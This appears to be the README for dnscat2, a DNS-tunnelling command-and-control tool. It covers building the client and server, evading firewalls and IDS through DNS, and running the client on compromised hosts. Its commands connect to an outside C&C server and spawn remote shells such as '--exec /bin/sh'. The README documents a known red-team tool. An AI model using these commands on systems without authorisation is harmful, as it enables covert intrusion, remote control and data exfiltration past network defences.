# Introduction

Welcome to dnscat2, a DNS tunnel that WON'T make you sick and kill you!

This tool is designed to create a command-and-control (C&C) channel over
the DNS protocol, which is an effective tunnel out of almost every
network.

This README file should contain everything you need to get up and
running! If you're interested in digging deeper into the protocol, how
the code is structured, future plans, or other esoteric stuff, check
out the doc/ folder.

# Where to get it

You can get the source from github here:

* https://github.com/iagox86/dnscat2

And the latest binaries here:

* TODO

# How to play

The theory behind dnscat is simple: it creates a tunnel over the DNS
protocol.

Why? Because DNS has an amazing property: it'll make its way from server
to server until it figures out where it's supposed to go.

That means that for dnscat to get traffic off a secure network, it
simply has to send messages to *a* DNS server, which will happily
forward things through the DNS network until it gets to *your* dnscat
server.

That, of course, assumes you have access to an authoritative DNS server.
dnscat also supports "direct" connections - that is, running a dnscat
client that directly connects to your dnscat on your ip address and UDP
port 53. The traffic still looks like DNS traffic, and might get past
dumber IDS/IPS systems, but is still likely to be stopped by firewalls.

I don't currently have a guide on how to set up an authoritative DNS
server, but I use GoDaddy at the moment and it works fine!

## Compiling

### Client

Compiling the client should be pretty straight forward - all you should
need to compile is make/gcc (for Linux) or Microsoft Visual Studio (for
Windows). Here are the commands on Linux:

    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/client/
    $ make

On Windows, load client/win32/dnscat2.vcproj into Visual Studio and hit
"build".

If compilation fails, please file a bug on my [github
page](https://github.com/iagox86/dnscat2/issues)! Please send details
about your system.

You can verify it's working by running it with no flags; you'll see it
attempting to start a DNS tunnel with whatever your configured DNS
server is:

    $ ./dnscat
    \[\[ WARNING \]\] :: INPUT: Command
    \[\[ WARNING \]\] :: Session successfully created: 23518
    \[\[ WARNING \]\] :: Session creation request
    \[\[ WARNING \]\] :: Starting DNS driver without a domain! You'll probably need to use --host to specify a direct connection to your server.
    \[\[ WARNING \]\] :: Setting config: max_packet_length => 115
    \[\[ WARNING \]\] :: OUTPUT: DNS tunnel to 8.8.8.8:53 (no domain set!  This probably needs to be the exact server where the dnscat2 server is running!)
    \[\[ ERROR \]\] :: DNS: RCODE_NAME_ERROR
    \[\[ ERROR \]\] :: DNS: RCODE_NAME_ERROR

### Server

The server isn't "compiled", as such, but it does require some Ruby
dependencies. Unfortunately, Ruby dependencies can be annoying to get
working, so good luck!

I'm assuming you have Ruby and Gem installed and in working order. If
they aren't, install them with either `apt-get`, `emerge`, `rvm`, or
however is normal on your operating system.

Once Ruby/Gem are sorted out, run these commands (note: you can
obviously skip the `git clone` command if you already installed the
client and skip the `gem install bundler` if you've already installed
bundler):

    $ git clone https://github.com/iagox86/dnscat2.git
    $ cd dnscat2/server/
    $ gem install bundler
    $ bundle install

If you get a permissions error with `gem install bundler` or `bundler
install`, you may need to run them as root.

If you get an error that looks like this:

    /usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require': cannot load such file -- mkmf (LoadError)

It means you need to install the -dev version of Ruby:

    $ sudo apt-get install ruby-dev

I find that `sudo` isn't always enough to get everything working right,
I sometimes have to switch to root and work directly.

You can verify it's working by running it with no flags and seeing if
you get a dnscat2> prompt:

    $ sudo ruby ./dnscat2.rb
    Setting debug level to: WARNING
    It looks like you didn't give me any domains to recognize!
    That's cool, though, you can still use a direct connection!
    Try running this on your client:
    
    ./dnscat2 --host <server>
    
    Of course, you have to figure out <server> yourself!
    
    Starting DNS server...
    Starting Dnscat2 DNS server on 0.0.0.0:5133 [domains = n/a]...
    No domains were selected, which means this server will only respond to
    direct queries (using --host and --port on the client)
    
    dnscat2> 

If you don't run it as root, you might have trouble listening on UDP/53
(you can use --dnsport to change it).

If anybody has a better guide on how to get the Ruby dependencies,
please don't hesitate to send me a better guide or a pull request! I
find the Ruby dependency system confusing, which means I'm probably
using it wrong. :)

## Usage

### Client + server

Before we talk about how to specifically use the tools, let's talk about
how dnscat is structured. The dnscat tool is divided into two pieces: a
client and a server. As you noticed if you went through the compilation,
the client is written in C and the server is in Ruby.

Generally, the server is run first. It can be long lived, and handle as
many clients as you'd like. As I said before, it's basically a C&C
service.

Later, a client is run, which opens a session with the server (more on
sessions below). The session can either traverse the DNS hierarchy
(recommended, but more complex) or connect directly to the server.
Traversing the DNS hierarchy requires an authoritative domain, but will
bypass most firewalls. Connecting directly to the server is more
obvious for several reasons.

### Running a server

The server - which is typically run on the authoritative DNS server for
a particular domain - is designed to be feature-ful, interactive, and
user friendly. It's written in Ruby, and much of its design is inspired
by Metasploit and Meterpreter.

If you followed the compilation instructions above, you should be able
to just run the server:

    $ ruby ./dnscat2.rb skullseclabs.org

Where "skullseclabs.org" is your own domain. If you don't have an
authoritative DNS server, just leave it off and the server will only
respond to queries sent directly to it.

That should actually be all you need! Other than that, you can test it
using the client's --ping command on any other system, which should be
available if you've compiled it:

    $ ./dnscat --ping skullseclabs.org

If the ping succeeds, your C&C server is probably good! Note that the
--ping command doesn't respect the --host/--port settings, it'll only do
a ping through the DNS hierarchy.

### Running a client

The client - which is typically run on a system after compromising it -
is designed to be simple, stable, and portable. It's written in C and
has as few library dependencies as possible, and compiles/runs natively
on Linux, Windows, Cygwin, and FreeBSD (and presumably Mac OS X as well,
but I haven't had the chance to test OS X support).

The client is given the domain name on the commandline, for example:

    ./dnscat2 skullseclabs.org

In that example, it will create a C&C session with the dnscat2 server
running on skullseclabs.org. If an authoritative domain isn't an option,
it can be given a specific ip address to connect to instead:

    ./dnscat2 --host 206.220.196.59 --port 5353

Assuming there's a dnscat2 server running on that host/port, it'll
create a session there.

### Sessions

I used the term "session" earlier - let's talk about sessions! A session
is a single virtual "connection" between a client and a server,
identified by a 16-bit session_id value. A client can maintain multiple
sessions with a single server (this happens when you spawn a shell from
within a command session, for example). A server can maintain multiple
sessions with multiple clients.

There are several different types of sessions, but the default one -
which I call a "command session" - is usually what you want (since the
other ones can be created via that command session). If you want to play
with other session types, you can pass --console or --exec to the dnscat
client (the server will recognize the type automatically).

The server maintains a tree of sessions - in a what-created-what type of
order - including a top-level virtual session. When you start the
dnscat2 server, you'll be in that virtual session:

    dnscat2>

You can list the sessions using the `sessions` command (initially,
there's only the one):

    dnscat2> sessions
    command window
    dnscat2>

When a new session is created, you'll be informed:

    dnscat2> sessions
    command window
    dnscat2>
    New session established: 2192
    New session established: 62456
    
    dnscat2> sessions
    command window
      [*] session 2192 :: command session
      [*] session 62456 :: command session

You can interact with these sessions using the `session -i` command:

    dnscat2> session -i 2192
    
    Welcome to a command session! Use 'help' for a list of commands or ^z for the main menu
    dnscat [command: 2192]> 

These sessions can spawn further sessions:

    dnscat [command: 2192]> shell
    Sent request to execute a shell
    dnscat [command: 2192]>
    New session established: 18644
    dnscat [command: 2192]> sessions
    Sessions:
    
    session 2192 :: command session
     session 18644 :: executing a shell

Note that when you run `sessions` from within a session, it only displays
itself and any sessions below it.  If you want to go "back" to a parent
session, use either ctrl-z or the "back" command:

    dnscat [command: 2192]> back
    [...]
    dnscat2> sessions
    command window
      session 2192 :: command session
       session 18644 :: executing a shell
      [*] session 62456 :: command session
    dnscat2> 

Note that some sessions start with `[*]` - that means that there's been
activity since the last visit.

When you interact with a session, the interface will look different
depending on the session type. As you saw with the default session type
- command sessions - you get a UI just like the top-level virtual
session. however, if you interact with a 'shell' session, you won't see
anything immediately, until you type a command:

    dnscat2> session -i 18644
    
    pwd
    /home/ron/tools/dnscat2/client

To escape this, you can use ctrl-z or type "exit" (which will, of
course, kill the session).

You can start a shell directly by running the dnscat client with the
--exec flag:

    $ ./dnscat --host localhost --port 5133 --exec /bin/sh

On the server, you'll see a session created as usual:

    dnscat2>
    New session established: 52356
    dnscat2> sessions
    command window
      [*] session 2192 :: command session :: [closed]
       session 18644 :: executing a shell
      [*] session 62456 :: command session
     session 52356 :: /bin/sh

And you can interact with it as normal:

    dnscat2> session -i $newest
    
    pwd
    /usr/local/google/home/rbowes/tools/dnscat2/client

(Note that I used $newest as a variable - $newest always refers to the
most recent session! See other variables by running `set`)

Lastly, to kill a session, the `kill` command can be used:

    dnscat2> kill 2192
    Session killed
    dnscat2> sessions
    command window
      [*] session 2192 :: command session :: [closed]
       session 18644 :: executing a shell
      [*] session 62456 :: command session
     session 52356 :: /bin/sh


# History

dnscat2 - the successor to dnscat, also written by me - is an attempt to
right some of the wrongs that I committed while writing the original
version of dnscat. The biggest problem being a total lack of testing or
of forethought into the protocol.

The original dnscat was heavily linked to the dns protocol. It tried to
encode the various control fields - things like sequence number - into
the DNS protocol directly.

dnscat2, on the other hand, treats everything as a stream of bytes, and
uses logic to convert that stream of bytes into dns requests. Thus, it's
a layered protocol, with DNS being a lower layer.

I invented a protocol that I'm calling the dnscat protocol. You can find
documentation about it in docs/protocol.md. It's a simple polling
network protocol, where the client occasionally polls the server, and
the server responds with a message (or an error code). The protocol is
designed to be resilient to the various issues I had with dnscat1 - that
is, it can handle out-of-order packets, dropped packets, and duplicated
packets equally well.

Finally, one last change from the original dnscat is that I decided not
to use the same program for both clients and servers. It turns out that
dnscat servers are much more complex than clients, so it made sense to
write the server in a higher level language (I chose Ruby), while still
keeping the client (written in C) as functional/simple/portable as I
possibly could.
